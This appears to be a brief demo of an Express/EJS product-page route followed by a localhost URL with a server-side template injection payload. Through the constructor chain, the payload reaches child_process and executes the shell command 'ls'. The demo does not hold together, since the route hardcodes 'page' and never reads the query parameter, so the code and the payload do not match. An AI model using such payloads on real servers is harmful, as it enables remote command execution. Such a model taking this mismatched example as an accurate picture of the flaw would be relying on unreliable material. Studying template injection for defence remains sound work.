source code:

```
app.get('/product/:id', function(req, res) {
    var productId = req.params.id;
    var product = getProductById(productId);

    var source = `
        <html>
            <body>
                <h1><%= page %></h1>
                <h2><%= product.name %></h2>
                <p><%= product.description %></p>
                <p>Price: <%= product.price %></p>
            </body>
        </html>
    `;

    var template = ejs.compile(source);
    var context = {
        product: product,
        page: 'Product Detail'
    };
    var html = template(context);

    res.send(html);
});
```

```http://localhost:4000/product/1?page=<%= this.constructor.constructor('return process')().mainModule.require('child_process').exec('ls') %>```
